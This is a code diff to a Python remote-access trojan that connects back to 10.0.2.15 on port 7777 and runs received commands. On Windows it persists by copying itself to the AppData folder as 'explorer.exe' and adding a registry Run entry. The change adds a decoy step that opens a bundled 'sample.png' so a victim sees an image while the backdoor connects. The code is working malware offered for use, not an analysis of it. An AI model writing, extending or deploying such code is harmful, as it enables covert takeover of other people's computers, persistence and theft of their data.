@@ -2,28 +2,30 @@ import sys
 
 
 from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
-from subprocess import check_output, call, DEVNULL
+from subprocess import Popen, run, check_output, call, DEVNULL
 from os import chdir, devnull, environ, path
 from shutil import copyfile
 from platform import system, release
+from pathlib import Path
 from base64 import b64decode, b64encode
 from typing import NamedTuple, List
 from json import dumps, loads
 
 
-class Options(NamedTuple):
-    ip: str
-    port: int
+class Environment(NamedTuple):
+    platform: str
+    release: str
 
 
 class Client(object):
-    def __init__(self, ip: str, port: int):
+    def __init__(self, env: 'Environment' = Environment('',''), ip: str = '', port: int = ''):
+        self.env = env
         self.connection = socket(AF_INET, SOCK_STREAM)
         self.connection.connect((ip, port))
 
     def become_persistent(self):
         platform = f'{system()}: {release()}'
-        if 'Windows' in platform:
+        if 'Windows' in self.env.platform:
             file_loc = environ["appdata"] + "\\explorer.exe"
             if not path.exists(file_loc):
                 copyfile(sys.executable, file_loc)
@@ -34,9 +36,9 @@ class Client(object):
                     f'/t REG_SZ',
                     f'/d "{file_loc}"']
                 )
-        if 'Linux' in platfrom:
+        if 'Linux' in self.env.platform:
             raise NotImplementedError('TODO')
-        if 'Darwin' in platform:
+        if 'Darwin' in self.env.platform:
             raise NotImplementedError('TODO')
         
 
@@ -92,9 +94,28 @@ class Client(object):
             self.send(result)
 
 
+def open_front_file(file_path, env):
+    if 'Linux' in env.platform:
+        run(['xdg-open', file_path], check=True)
+    elif 'Windows' in env.platform:
+        run(['open', file_path], check=True)
+    elif 'Dawrin' in env.platform:
+        run(['open', file_path], check=True)
+
+
 def main(*args, **kwargs) -> None:
+    env = Environment(platform=system(), release=release())
+    file_name = 'sample.png'
+    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
+        file_path = Path(sys._MEIPASS) # pylint: disable=no-member
+    else:
+        file_path = Path(__file__).parent
+
+    front_file = Path.cwd() / file_path / file_name
+    open_front_file(front_file, env)
+
     try:
-        client = Client('10.0.2.15', 7777)
+        client = Client(env, '10.0.2.15', 7777)
         client.run()
     except Exception as e:
         sys.exit()
